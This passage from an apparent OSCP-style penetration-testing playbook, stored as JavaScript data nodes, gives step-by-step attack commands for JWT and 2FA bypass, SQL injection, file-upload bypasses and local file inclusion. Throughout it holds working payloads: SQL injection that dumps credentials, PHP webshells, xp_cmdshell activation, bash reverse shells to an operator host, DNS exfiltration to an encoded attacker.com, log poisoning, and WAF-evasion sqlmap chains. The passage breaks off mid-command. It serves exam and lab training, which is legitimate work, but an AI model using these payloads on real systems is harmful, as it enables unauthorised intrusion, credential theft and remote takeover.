# Algorithm confusion: alg:none attack
# In Burp: decode header, change "alg":"RS256" → "alg":"none", remove signature
# Or: change "alg":"RS256" → "alg":"HS256" + sign with public key as HMAC secret

# Weak secret brute force
hashcat -a 0 -m 16500 JWT_TOKEN /usr/share/wordlists/rockyou.txt

# ── TIER 6: 2FA BYPASS ────────────────────
# Try: navigating directly to post-auth URL (skip 2FA entirely)
# Try: response manipulation — intercept 2FA check, change "success":false → true
# Try: reuse a previously captured valid OTP (race condition)
# Try: code enumeration if no lockout (0000-9999 for 4-digit)`,
    warn: "Always intercept the login request in Burp before running any tool — parameter names vary wildly (/login, /api/auth, /signin) and failure strings must be exact for hydra/ffuf to work. Timing differences (slow = valid user hitting bcrypt vs fast = user not found) can enumerate users even when response bodies are identical.",
    choices: [
      { label: "Got access", next: "authenticated_enum" },
      { label: "SQLi bypass worked — authenticated", next: "file_upload" },
      { label: "Login responded oddly to SQLi probes — investigate", next: "sqli_test" },
      { label: "JWT token in response", next: "jwt_attack" },
      { label: "File upload inside app", next: "file_upload" },
      { label: "Need usernames first", next: "web_fuzz_deep" },
      { label: "Admin panel — RCE path", next: "wp_shell" },
    ],
  },

  sqli_test: {
    phase: "WEB",
    title: "SQL Injection — Detection",
    body: "Manual detection first. Understand what the injection IS before you automate. PortSwigger: the injection type determines the entire attack chain — error-based, UNION, blind boolean, blind time each need a different approach.",
    cmd: `# ── STEP 1: DETECT ──────────────────────
# Inject quote — look for error or behavioral change
'
''
# Numeric context
1 AND 1=1
1 AND 1=2    # different response = boolean blind

# ── STEP 2: IDENTIFY TYPE ────────────────
# Error-based:    DB error visible in response body
# UNION-based:    predictable column structure returned
# Boolean blind:  same status code, different content length
# Time-based:     no visible difference — use delays

# ── STEP 3: COLUMN COUNT (for UNION) ────
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--   # error at N = N-1 columns
# In URL-encoded POST body — use + for spaces, --+- as comment:
# username='order+by+5--+-&password=test
# Increment until error, then back off by 1 = column count

# Or increment NULLs:
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--

# ── STEP 4: FIND STRING COLUMN (CANARY) ──
# Inject unique markers — see which one appears in the response
' UNION SELECT 'A1','B2','C3'--+-
# B2 visible in response = column 2 is your string column
# Use that column for all data extraction

# ── COMMENT STYLE REFERENCE ───────────────
# -- -    (space after double-dash)  → MySQL, PostgreSQL
# --+-    (URL-encoded space)        → MySQL in POST bodies  ← USE THIS IN FORMS
# #       (hash)                     → MySQL
# /**/    (inline comment)           → most engines

# ── SQLMAP QUICK START ───────────────────
sqlmap -u "http://$ip/page?id=1" --batch --level=2 --risk=2
sqlmap -u "http://$ip/login" --data="user=a&pass=b" --batch
# Target a specific parameter (when sqlmap guesses wrong):
sqlmap -u "http://$ip/page?id=1&cat=2" -p id --batch`,
    warn: "Read the RESPONSE not just the status code. Content length change with same 200 = boolean blind. Delay = time-based blind. Error text = error-based. These are different attack paths. In URL-encoded POST bodies, use + for spaces and --+- as the comment terminator — plain -- often fails.",
    choices: [
      { label: "Error visible in response — error-based", next: "sqli_error" },
      { label: "Column count found — UNION injection", next: "sqli_union" },
      { label: "Behavior changes but no output — blind boolean", next: "sqli_blind" },
      { label: "No difference at all — time-based blind", next: "sqli_time" },
      { label: "WAF blocking payloads", next: "sqli_waf" },
      { label: "sqlmap confirmed — escalate", next: "sqli_sqlmap" },
    ],
  },

  sqli_error: {
    phase: "WEB",
    title: "SQLi — Error-Based Extraction",
    body: "Error messages leak data directly into the response. Fastest extraction method when available. PortSwigger: use extractvalue() or updatexml() for MySQL, cast() for PostgreSQL, convert() for MSSQL.",
    cmd: `# ── MYSQL: extractvalue ──────────────────
' AND extractvalue(1,concat(0x7e,(SELECT version())))--
' AND extractvalue(1,concat(0x7e,(SELECT user())))--
' AND extractvalue(1,concat(0x7e,(SELECT database())))--

# Enumerate tables
' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database())))--

# Enumerate columns
' AND extractvalue(1,concat(0x7e,(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users')))--

# Dump credentials (page results with LIMIT)
' AND extractvalue(1,concat(0x7e,(SELECT concat(username,0x3a,password) FROM users LIMIT 0,1)))--
' AND extractvalue(1,concat(0x7e,(SELECT concat(username,0x3a,password) FROM users LIMIT 1,1)))--

# ── MYSQL: updatexml alternative ─────────
' AND updatexml(1,concat(0x7e,(SELECT version())),1)--

# ── MSSQL: convert ───────────────────────
' AND 1=convert(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
' AND 1=convert(int,(SELECT TOP 1 column_name FROM information_schema.columns WHERE table_name='users'))--

# ── POSTGRESQL: cast ─────────────────────
' AND 1=cast((SELECT version()) as int)--
' AND 1=cast((SELECT usename FROM pg_user LIMIT 1) as int)--

# ── SUBSTRING CHAINING ───────────────────
# extractvalue() cap is 32 chars. For long hashes/tokens, slice in 31-char chunks.
# Round 1 – chars 1-31
' AND extractvalue(1,concat(0x7e,(SELECT substring(password,1,31) FROM users LIMIT 1)))--
# Round 2 – chars 32-62
' AND extractvalue(1,concat(0x7e,(SELECT substring(password,32,31) FROM users LIMIT 1)))--
# Round 3 – chars 63+ (increment by 31 until blank after 0x7e)
' AND extractvalue(1,concat(0x7e,(SELECT substring(password,63,31) FROM users LIMIT 1)))--

# ── GROUP_CONCAT TRUNCATION FIX ──────────
# Default group_concat_max_len = 1024 bytes — paginate instead of raising the limit.
# Page 1 (tables 0-4)
' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name SEPARATOR ',') FROM information_schema.tables WHERE table_schema=database() LIMIT 5 OFFSET 0)))--
# Page 2 (tables 5-9) — increment OFFSET by 5 until error returns empty after 0x7e
' AND extractvalue(1,concat(0x7e,(SELECT group_concat(table_name SEPARATOR ',') FROM information_schema.tables WHERE table_schema=database() LIMIT 5 OFFSET 5)))--

# ── MSSQL STACKED QUERIES (convert() fallback) ───────────────────────
# When convert(int,...) errors are suppressed, use stacked execution to confirm:
'; SELECT @@version--
'; SELECT DB_NAME()--
# If stacks are live, chain toward RCE — confirm sa role first:
'; SELECT IS_SRVROLEMEMBER('sysadmin')--
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE--
'; EXEC xp_cmdshell('whoami')--

# ── ERROR VISIBILITY — catch what the UI swallows ────────────────────
# Browsers and JS frontends often hide 500 bodies. Go raw:
curl -s -i -X GET "http://TARGET/item?id=1'" | grep -iE "error|sql|syntax|warning"
curl -s -i -X POST "http://TARGET/login" --data "user=admin'&pass=x" | grep -iE "error|sql|syntax"
# Burp: Proxy > HTTP history > right-click response > "Do intercept" to see raw body
# Or: Proxy > Options > match/replace rule — grep on "SQL|error|syntax" in response`,
    warn: "extractvalue() output is capped at 32 chars — use substring() chaining to read long hashes in 31-char chunks. group_concat() is capped at 1024 bytes by default — paginate with LIMIT/OFFSET to avoid truncated table lists. Always verify errors reach you: curl -s -i or Burp response interception — apps frequently swallow 500 bodies before they hit the browser.",
    choices: [
      { label: "Got credentials", next: "creds_found" },
      { label: "DB structure mapped — escalate to FILE", next: "sqli_shell" },
      { label: "MSSQL — xp_cmdshell path", next: "mssql" },
      { label: "Output truncating — switch to UNION", next: "sqli_union" },
    ],
  },

  sqli_union: {
    phase: "WEB",
    title: "SQLi — UNION-Based Extraction",
    body: "UNION injection appends your SELECT to the original query and returns data in the response. Two prerequisites: you must match the exact column count of the original query, and at least one column must accept a string. The A1/B2/C3 canary technique finds the reflected column fast — inject unique string markers and see which one appears in the page. Once you know which column reflects, every piece of data flows through it via subqueries.",
    cmd: `# ── STEP 1: FIND COLUMN COUNT (ORDER BY) ──
# Increment until you get an error — last working number = column count
' ORDER BY 1--+-
' ORDER BY 2--+-
' ORDER BY 5--+-    # error here → 4 columns
' ORDER BY 4--+-    # works → confirmed 4 columns
# In POST body (URL-encoded):
# username='order+by+5--+-&password=attempt

# ── STEP 2: FIND REFLECTED COLUMN (CANARY) ─
# Inject unique string markers in every position
# Look at the page — whichever value appears is your extraction column
' UNION SELECT 'A1','B2','C3','D4','E5'--+-
# See 'B2' in response → column 2 is your string column

# POST body example (5 columns, column 2 reflects):
# username='+UNION+select+'A1','B2','C3','D4','E5'--+-&password=attempt

# ── STEP 3: DATABASE FINGERPRINT ──────────
' UNION SELECT 'A1',database(),'C3','D4','E5'--+-
' UNION SELECT 'A1',version(),'C3','D4','E5'--+-
' UNION SELECT 'A1',user(),'C3','D4','E5'--+-

# ── STEP 4: ENUMERATE TABLES ──────────────
# Method 1 — subquery into column 2:
' UNION SELECT 'A1',(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),'C3','D4','E5'--+-

# Method 2 — direct (cleaner when original query returns no rows):
' UNION SELECT 'A1',table_name,'C3','D4','E5' FROM information_schema.tables WHERE table_schema=database()--+-

# ── STEP 5: ENUMERATE COLUMNS ─────────────
# All columns in a specific table:
' UNION SELECT 'A1',(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users'),'C3','D4','E5'--+-

# All columns scoped to current DB (avoids cross-DB noise):
' UNION SELECT 'A1',(SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema=database()),'C3','D4','E5'--+-

# Direct method:
' UNION SELECT 'A1',column_name,'C3','D4','E5' FROM information_schema.columns WHERE table_name='users'--+-

# ── STEP 6: DUMP CREDENTIALS ──────────────
# group_concat with @@ separator — all rows in one response
' UNION SELECT 'A1',group_concat(name,'@@',username,'@@',password),'C3','D4','E5' FROM users--+-

# Colon separator (classic):
' UNION SELECT 'A1',group_concat(username,0x3a,password SEPARATOR 0x0a),'C3','D4','E5' FROM users--+-

# If original query returns rows and drowns yours:
' AND 1=0 UNION SELECT 'A1',group_concat(username,0x3a,password),'C3','D4','E5' FROM users--+-

# ── STEP 7: FILE READ ─────────────────────
# Requires FILE privilege on DB user
' UNION SELECT 'A1',load_file('/etc/passwd'),'C3','D4','E5'--+-
' UNION SELECT 'A1',load_file('/var/www/html/config.php'),'C3','D4','E5'--+-
' UNION SELECT 'A1',load_file('/etc/apache2/sites-enabled/000-default.conf'),'C3','D4','E5'--+-

# ── MSSQL VARIANT ─────────────────────────
' UNION SELECT NULL,@@version,NULL--
' UNION SELECT NULL,name,NULL FROM master..sysdatabases--
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--`,
    warn: "If UNION returns nothing but no error: the original query returns multiple rows drowning yours — add AND 1=0 before UNION to suppress original results. If column type mismatch error: replace string markers with NULL for non-string columns (e.g. 'A1',NULL,NULL) or cast: CAST(version() AS CHAR). The @@ separator in group_concat is more readable than 0x3a (:) when dumping multiple fields — use something that won't appear in the data.",
    choices: [
      { label: "Dumped credentials — crack or reuse", next: "creds_found" },
      { label: "FILE read working — hunting configs", next: "sqli_shell" },
      { label: "MSSQL — escalate to xp_cmdshell", next: "mssql" },
      { label: "Write webshell via INTO OUTFILE", next: "sqli_shell" },
    ],
  },

  sqli_blind: {
    phase: "WEB",
    title: "SQLi — Blind Boolean Extraction",
    body: "No data in response — only true/false behavior difference. PortSwigger: infer data one character at a time. Confirm the technique manually with 2-3 payloads then hand off to sqlmap.",
    cmd: `# ── CONFIRM BOOLEAN BLIND ────────────────
# True — normal response
' AND 1=1--
# False — different response (shorter, empty, redirect)
' AND 1=2--
# Must see a consistent behavioral difference

# ── MANUAL CONFIRMATION (2-3 tests) ─────
# DB version starts with '8'?
' AND substring(version(),1,1)='8'--
# Current user is 'root'?
' AND (SELECT user())='root'--
# Table 'users' exists?
' AND (SELECT count(*) FROM users)>0--

# ── HAND OFF TO SQLMAP ───────────────────
# Boolean-only technique flag:
sqlmap -u "http://$ip/page?id=1" --technique=B --batch --level=3 --current-db

# Target a specific parameter (-p) when sqlmap picks the wrong one:
sqlmap -u "http://$ip/page?id=1&cat=2" -p id --technique=B --batch --dbs

sqlmap -u "http://$ip/page?id=1" --technique=B --batch \
  -D [dbname] -T users -C username,password --dump

# POST data blind
sqlmap -u "http://$ip/login" --data="user=a&pass=b" \
  --technique=B --batch --level=3 --dbs

# ── ESCALATE WHEN LEVEL=3 FINDS NOTHING ──
# Level 2-3 misses some injection points — escalate:
sqlmap -u "http://$ip/page?id=1" --batch --level=5 --risk=3 --dbs
# --level=5: tests headers (User-Agent, Referer, Cookie) as injection points
# --risk=3:  includes UPDATE/INSERT payloads (heavier, use carefully)
# Combined: catches injections in Cookie, User-Agent, X-Forwarded-For

# Cookie injection (inject into session cookie):
sqlmap -u "http://$ip/page" --cookie="id=1*" --batch --level=3

# ── BURP INTRUDER (manual extraction) ────
# Payload template:
# ' AND substring((SELECT password FROM users LIMIT 0,1),§POS§,1)='§CHAR§'--
# Cluster bomb: POS = 1..32, CHAR = a-z,0-9,special
# True = different response Content-Length`,
    warn: "Boolean blind is very slow manually — 8 requests per character at minimum. Confirm with 2-3 payloads then sqlmap with --technique=B. If level=3 finds nothing, escalate to --level=5 --risk=3 which tests Cookie and header injection points that lower levels skip. Use -p to force sqlmap onto the correct parameter when it guesses wrong.",
    choices: [
      { label: "sqlmap extracting — got credentials", next: "creds_found" },
      { label: "Behavior too inconsistent — try time-based", next: "sqli_time" },
      { label: "WAF interfering", next: "sqli_waf" },
    ],
  },

  sqli_time: {
    phase: "WEB",
    title: "SQLi — Time-Based Blind",
    body: "Last resort — no visible response difference at all. PortSwigger: infer data from deliberate delays. Network latency makes this unreliable. Confirm then use sqlmap.",
    cmd: `# ── CONFIRM TIME-BASED ───────────────────
# MySQL SLEEP — expect 5 second delay
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--

# MSSQL WAITFOR
'; WAITFOR DELAY '0:0:5'--

# PostgreSQL pg_sleep
'; SELECT pg_sleep(5)--

# ── CONDITIONAL EXTRACTION ───────────────
# Confirm technique before sqlmap
' AND IF(substring(version(),1,1)='8',SLEEP(3),0)--
' AND IF((SELECT user())='root',SLEEP(3),0)--

# ── SQLMAP TIME-BASED ────────────────────
sqlmap -u "http://$ip/page?id=1" \
  --technique=T --time-sec=5 --batch --level=3 \
  --current-db

sqlmap -u "http://$ip/page?id=1" \
  --technique=T --time-sec=5 --batch \
  -D [dbname] -T users -C username,password --dump

# ── OUT-OF-BAND FALLBACK ─────────────────
# MySQL DNS exfil (requires outbound DNS)
' AND load_file(concat(0x5c5c5c5c,(SELECT version()),0x2e,0x61747461636b65722e636f6d,0x5c5c,0x7368617265))--
# Use interactsh or Burp Collaborator to catch callback`,
    warn: "Server load makes time-based unreliable — a busy server looks the same as a SLEEP(5). Increase --time-sec=8 on slow networks. If delays are wildly inconsistent, the technique won't work reliably.",
    choices: [
      { label: "sqlmap confirmed — extracting", next: "sqli_sqlmap" },
      { label: "Got credentials", next: "creds_found" },
      { label: "Unstable — look for other vectors", next: "web_fuzz_deep" },
    ],
  },

  sqli_waf: {
    phase: "WEB",
    title: "SQLi — WAF Evasion",
    body: "WAF pattern-matching keywords and characters. PortSwigger: evasion uses encoding, comment injection, case variation, and whitespace alternatives to break patterns without breaking SQL syntax.",
    cmd: `# ── DETECT WAF ───────────────────────────
wafw00f http://$ip
# 403/406/501 on SQL payloads = WAF active

# ── ENCODING BYPASSES ────────────────────
# URL encode critical chars
%27 = '     %20 = space     %2D%2D = --
# Double encode
%2527 = %27 = '

# Hex string encoding (MySQL)
0x61646d696e = 'admin'
' UNION SELECT NULL,0x61646d696e,NULL--

# ── COMMENT INJECTION ────────────────────
# Break keywords with inline comments
UN/**/ION SEL/**/ECT NULL,version(),NULL--
' UN/**/ION SEL/**/ECT NULL,version(),NULL--

# MySQL version comments
/*!UNION*/ /*!SELECT*/ NULL,version(),NULL--
/*!50000 union*/ /*!50000 select*/ NULL,version(),NULL--

# ── CASE + SPACE VARIATION ───────────────
uNiOn SeLeCt
UnIoN aLl SeLeCt

# Space substitutes: /**/ %09(tab) %0a(newline) %0d +
'%09UNION%09SELECT%09NULL,version(),NULL--

# ── SQLMAP TAMPER SCRIPTS ────────────────
sqlmap -u "http://$ip/page?id=1" \
  --tamper=space2comment,between,randomcase,charencode \
  --random-agent --delay=1 --batch --level=3

# Common tampers:
# space2comment  — spaces → /**/
# between        — > → BETWEEN x AND y
# randomcase     — random keyword casing
# charencode     — URL encode payload
# unmagicquotes  — bypass magic quote escaping
# base64encode   — base64 the payload

# Aggressive evasion stack:
sqlmap -u "http://$ip/page?id=1" \
  --tamper=space2comment,charencode,between,randomcase \
  --random-agent --delay=2 --retries=3 \
  --batch --level=5 --risk=3`,
    warn: "Aggressive scanning gets you rate-limited or blocked entirely. Add --delay=2 to sqlmap. Slow + encoded > fast + obvious against a WAF.",
    choices: [
      { label: "Bypass worked — UNION extraction", next: "sqli_union" },
      { label: "Bypass worked — sqlmap running", next: "sqli_sqlmap" },
      { label: "WAF too aggressive — different param", next: "sqli_blind" },
    ],
  },

  sqli_sqlmap: {
    phase: "WEB",
    title: "SQLi — sqlmap Full Escalation",
    body: "sqlmap is allowed on OSCP. Use it confidently but understand each flag. The escalation ladder: confirm → enumerate → dump → OS shell → file write.",
    cmd: `# ── STEP 1: CAPTURE REQUEST IN BURP → req.txt ──
# In Burp: right-click request → "Save item" → req.txt
# This is the cleanest approach — handles cookies, POST, headers automatically
sqlmap -r req.txt --batch --dbs
sqlmap -r req.txt --batch --level=3 --risk=2 --dbs   # escalated
sqlmap -r req.txt --batch --random-agent --dbs        # rotate User-Agent

# Mark the injection point manually in req.txt with *:
# username=admin*&password=test   ← sqlmap injects at *

# ── STEP 2: URL-BASED (when no Burp) ─────
sqlmap -u "http://$ip/page?id=1" --batch --dbs
# Target specific param (-p):
sqlmap -u "http://$ip/page?id=1&cat=2" -p id --batch --dbs
# HTTPS:
sqlmap -u "https://$ip/page?id=1" --batch --force-ssl --dbs

# ── STEP 3: DUMP CREDENTIALS ─────────────
sqlmap -r req.txt --batch -D [dbname] --tables
sqlmap -r req.txt --batch -D [dbname] -T users --columns
sqlmap -r req.txt --batch -D [dbname] -T users -C username,password --dump

# ── COOKIE INJECTION ─────────────────────
sqlmap -u "http://$ip/page" --cookie="id=1*" --batch --level=3

# ── AUTHENTICATED SESSION ─────────────────
sqlmap -u "http://$ip/page?id=1" \
  --headers="Authorization: Bearer TOKEN" --batch

# ── OS SHELL ─────────────────────────────
# Requires: MySQL FILE priv OR MSSQL sa/xp_cmdshell
sqlmap -r req.txt --os-shell
# If webroot unknown — find it first:
sqlmap -r req.txt --file-read="/etc/apache2/sites-enabled/000-default.conf"
sqlmap -r req.txt --file-read="/etc/nginx/sites-enabled/default"

# ── FILE READ ────────────────────────────
sqlmap -r req.txt --file-read="/etc/passwd"
sqlmap -r req.txt --file-read="/var/www/html/config.php"

# ── FILE WRITE (webshell) ─────────────────
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php
sqlmap -r req.txt --file-write="/tmp/shell.php" --file-dest="/var/www/html/shell.php"

# ── MSSQL STACKED QUERIES → SHELL ────────
sqlmap -r req.txt --technique=S --os-shell`,
    warn: "Always use -r req.txt from a Burp capture — it handles authentication cookies, POST bodies, and custom headers automatically without manual reconstruction. --os-shell fails silently with wrong webroot path — file-read the server config first to find the exact path. Add --random-agent to bypass WAFs that block sqlmap's default User-Agent string.",
    choices: [
      { label: "Dumped credentials", next: "creds_found" },
      { label: "os-shell working — upgrade to reverse shell", next: "sqli_shell" },
      { label: "File write succeeded — webshell live", next: "sqli_shell" },
      { label: "MSSQL — xp_cmdshell", next: "mssql" },
    ],
  },

  sqli_shell: {
    phase: "WEB",
    title: "SQLi → Shell",
    body: "DB access to OS shell. INTO OUTFILE for MySQL (needs FILE priv + webroot path). xp_cmdshell for MSSQL. COPY TO for PostgreSQL. Know the webroot — file write to wrong path is silent failure.",
    cmd: `# ── MYSQL: INTO OUTFILE ──────────────────
# Requires FILE privilege + writable webroot

# 1. Confirm FILE privilege
' UNION SELECT NULL,file_priv,NULL FROM mysql.user WHERE user=user()--

# 2. Find webroot
' UNION SELECT NULL,load_file('/etc/apache2/sites-enabled/000-default.conf'),NULL--
' UNION SELECT NULL,load_file('/etc/nginx/sites-enabled/default'),NULL--
' UNION SELECT NULL,load_file('/var/www/html/index.php'),NULL--

# 3. Write webshell
' UNION SELECT NULL,"<?php system($_GET['cmd']); ?>",NULL INTO OUTFILE '/var/www/html/shell.php'--

# 4. Verify + execute
curl "http://$ip/shell.php?cmd=id"
curl "http://$ip/shell.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$LHOST/$LPORT+0>%261'"

# ── MSSQL: xp_cmdshell ───────────────────
# Enable if disabled (requires sa or sysadmin)
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;--
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--

# Execute
'; EXEC xp_cmdshell 'whoami';--
'; EXEC xp_cmdshell 'powershell -nop -w hidden -enc [BASE64]';--

# ── POSTGRESQL: COPY TO ───────────────────
'; COPY (SELECT '<?php system($_GET[cmd]); ?>') TO '/var/www/html/shell.php';--

# ── SQLMAP SHORTCUT ──────────────────────
sqlmap -u "http://$ip/page?id=1" --os-shell
# If webroot known:
sqlmap -u "http://$ip/page?id=1" \
  --file-write="/tmp/shell.php" --file-dest="/var/www/html/shell.php"`,
    warn: "INTO OUTFILE fails silently if: (1) FILE privilege missing, (2) file already exists — SQL won't overwrite, (3) path is wrong. Confirm FILE priv first. If file exists, delete it via another vector or use sqlmap --file-write which does overwrite.",
    choices: [
      { label: "Webshell live — catch reverse shell", next: "reverse_shell" },
      { label: "xp_cmdshell working — catch shell", next: "reverse_shell" },
      { label: "No FILE priv — dump creds instead", next: "sqli_sqlmap" },
      { label: "Got creds from dump", next: "creds_found" },
    ],
  },

  file_upload: {
    phase: "WEB",
    title: "File Upload",
    body: "File upload filters have multiple layers — extension check, MIME/Content-Type check, magic bytes check, server-side execution configuration. Work each layer separately. One bypass is usually enough, but you need to know which layer is blocking you before you know which bypass to use. Always find out WHERE the file is uploaded before trying to execute it.",
    cmd: `# ── STEP 0: PREP YOUR SHELL ──────────────
# Minimal PHP webshell
echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php
# Multi-parameter shell (cmd via GET or POST)
echo '<?php if(isset($_REQUEST["cmd"])){ echo "<pre>"; $cmd=$_REQUEST["cmd"]; system($cmd); echo "</pre>"; } ?>' > shell.php

# ── STEP 1: FIND WHERE FILES GO ──────────
# Look at the response after upload — often includes path
# Check page source for <img src="..."> to find upload directory
# Common upload dirs: /uploads/, /files/, /media/, /images/, /assets/
# ffuf if no path given:
ffuf -u http://$ip/FUZZ/shell.php \\
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\
  -fc 404

# ── STEP 2: BYPASS TIER — EXTENSION ──────
# Alternate PHP extensions (check server config — any may execute as PHP)
shell.php3
shell.php4
shell.php5
shell.php7
shell.phtml
shell.phar
shell.shtml   # SSI — executes <!--#exec cmd="id" -->

# Case variation (Windows / case-insensitive checks)
shell.PHP
shell.PhP

# Double extension — check if server strips only last extension
shell.php.jpg
shell.php.png
shell.php%00.jpg    # null byte (PHP < 5.3.4)

# ── STEP 3: BYPASS TIER — CONTENT-TYPE ───
# In Burp: intercept upload request, change Content-Type header:
# Content-Type: image/jpeg      (most common bypass)
# Content-Type: image/png
# Content-Type: image/gif

# ── STEP 4: BYPASS TIER — MAGIC BYTES ────
# Prepend magic bytes to make file look like a valid image
# GIF: GIF89a + PHP payload
printf 'GIF89a
<?php system($_REQUEST["cmd"]); ?>' > shell.gif
# PNG: use exiftool to inject into metadata
exiftool -Comment='<?php system($_REQUEST["cmd"]); ?>' real_image.png
mv real_image.png shell.php.png
# JPEG magic bytes (hex): FF D8 FF
python3 -c "open('shell.php','wb').write(b'\xff\xd8\xff' + b'<?php system(\$_REQUEST["cmd"]); ?>')"

# ── STEP 4b: BYPASS TIER — .HTACCESS UPLOAD ──
# If extension blacklisting is in place but .htaccess uploads are allowed:
# Upload a .htaccess file that makes .jpg files execute as PHP:
echo "AddType application/x-httpd-php .jpg" > .htaccess
# Upload .htaccess to the upload directory
# Then upload shell.jpg (your PHP shell with .jpg extension)
# Browse to /uploads/shell.jpg?cmd=id — executes as PHP

# Also works with other extensions:
echo "AddType application/x-httpd-php .png" > .htaccess
echo "AddType application/x-httpd-php .gif" > .htaccess

# ── STEP 5: BYPASS TIER — FILENAME TRICKS ─
# Path traversal in filename (may write outside intended dir)
../shell.php
../../var/www/html/shell.php
# Burp: URL-encode the slashes in filename field → ..%2Fshell.php

# ── STEP 6: CONFIRM EXECUTION ────────────
curl "http://$ip/uploads/shell.php?cmd=id"
curl "http://$ip/uploads/shell.phtml?cmd=whoami"
# If .htaccess upload allowed — add execution rule
echo 'AddType application/x-httpd-php .jpg' > .htaccess
# Upload .htaccess first, then upload shell.jpg → executes as PHP

# ── STEP 7: UPGRADE TO REVERSE SHELL ─────
# URL-encode the payload before sending
curl "http://$ip/uploads/shell.php" \\
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'"`,
    warn: "Find the upload path BEFORE trying to execute — this is the most common time sink. If the app returns a URL in the upload response, copy it exactly. If extension filtering is client-side only (JavaScript), bypass it entirely by intercepting with Burp after the JS validation passes. .htaccess upload is a high-value technique on Apache — if you can upload arbitrary files, try uploading .htaccess first.",
    choices: [
      { label: "Upload worked — got webshell", next: "reverse_shell" },
      { label: "Execution blocked — combine with LFI", next: "lfi" },
      { label: "Found .git or config in upload dir", next: "web_enum" },
      { label: "IIS target — upload ASPX shell", next: "iis_aspx" },
    ],
  },

  lfi: {
    phase: "WEB",
    title: "Local File Inclusion → RCE",
    body: "LFI alone gets file reads. Escalate to RCE via log poisoning, PHP wrappers, /proc/self/environ, or RFI if allow_url_include is on. Windows paths and RCE paths are completely different from Linux — know both. The escalation hierarchy: wrappers first (fastest, no prerequisites), then /proc/self/environ, then log poisoning (requires writable/readable log). RFI is rare but instant RCE when available.",
    cmd: `# ── DETECTION ────────────────────────────
http://$ip/page?file=../../../../etc/passwd
http://$ip/page?file=../../../etc/passwd
http://$ip/page?file=/etc/passwd

# ── FILTER BYPASSES ──────────────────────
# Null byte (PHP < 5.3.4)
http://$ip/page?file=../../../../etc/passwd%00
# Double encode
http://$ip/page?file=..%252f..%252f..%252fetc%252fpasswd
# Path truncation (old PHP)
http://$ip/page?file=../../../../etc/passwd/././././././././././././././././.

# ── LINUX HIGH-VALUE FILES ────────────────
/etc/passwd
/etc/shadow
/etc/hosts
/etc/crontab
/proc/self/environ
/proc/self/cmdline
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/auth.log
/home/[user]/.ssh/id_rsa
/home/[user]/.bash_history
/var/www/html/config.php
/var/www/html/.env
/var/www/html/wp-config.php

# ── WINDOWS HIGH-VALUE FILES ──────────────
# win.ini = LFI canary on Windows — confirms it works
C:/Windows/win.ini
C:/Windows/System32/drivers/etc/hosts
C:/inetpub/wwwroot/web.config              # IIS — often has DB creds
C:/Windows/System32/inetsrv/config/applicationHost.config  # app pool creds
C:/xampp/apache/conf/httpd.conf
C:/xampp/FileZillaFTP/FileZilla Server.xml  # FTP creds
C:/ProgramData/MySQL/MySQL Server 5.5/my.ini
C:/Users/Administrator/Desktop/proof.txt
C:/Windows/repair/SAM

# Windows path traversal variations (try all)
..\\..\\..\\Windows\\win.ini
....//....//....//Windows/win.ini
%5c..%5c..%5cWindows%5cwin.ini

# ── PHP WRAPPERS → RCE ───────────────────
# php://filter — read source code base64-encoded (no RCE but gets source)
http://$ip/page?file=php://filter/convert.base64-encode/resource=index.php
# Decode: echo "BASE64" | base64 -d

# php://input — POST body executed as PHP (needs allow_url_include=On)
# Send this as the POST body with Content-Type: application/x-www-form-urlencoded:
curl -s -X POST "http://$ip/page?file=php://input" \
  -d "<?php system('id'); ?>"

# expect:// — direct command execution (needs expect extension)
http://$ip/page?file=expect://id
http://$ip/page?file=expect://bash+-c+'bash+-i+>%26+/dev/tcp/$LHOST/$LPORT+0>%261'

# data:// — inline PHP execution (needs allow_url_include=On)
http://$ip/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
# Decoded: <?php system($_GET['cmd']); ?>

# ── LOG POISONING → RCE ──────────────────
# Step 1: Poison the log by injecting PHP into a logged field
# Via User-Agent (Apache/Nginx access.log):
curl -s -A "<?php system(\$_GET['cmd']); ?>" http://$ip/
# Via SSH username (auth.log — works even on failed logins!):
ssh '<?php system($_GET["cmd"]); ?>'@$ip
# Via SMTP (mail.log):
nc $ip 25
EHLO test
MAIL FROM: <?php system($_GET['cmd']); ?>

# Step 2: Include the poisoned log via LFI
http://$ip/page?file=/var/log/apache2/access.log&cmd=id
http://$ip/page?file=/var/log/auth.log&cmd=id
http://$ip/page?file=/var/log/nginx/access.log&cmd=id

# Step 3: Upgrade to reverse shell
http://$ip/page?file=/var/log/auth.log&cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$LHOST/$LPORT+0>%261'

# ── FFUF LFI WORDLIST FUZZING ─────────────
# Linux
ffuf -u "http://$ip/page?file=FUZZ" \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt \
  -fw 0 -t 50

# Windows — dedicated Windows path list
ffuf -u "http://$ip/page?file=FUZZ" \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-windows.txt \
  -fw 0 -t 50 -mc 200

# Combined both OS (thorough)
ffuf -u "http://$ip/page?file=FUZZ" \
  -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
  -fw 0 -t 50

# Add traversal prefix if basic path blocked
ffuf -u "http://$ip/page?file=../../../FUZZ" \
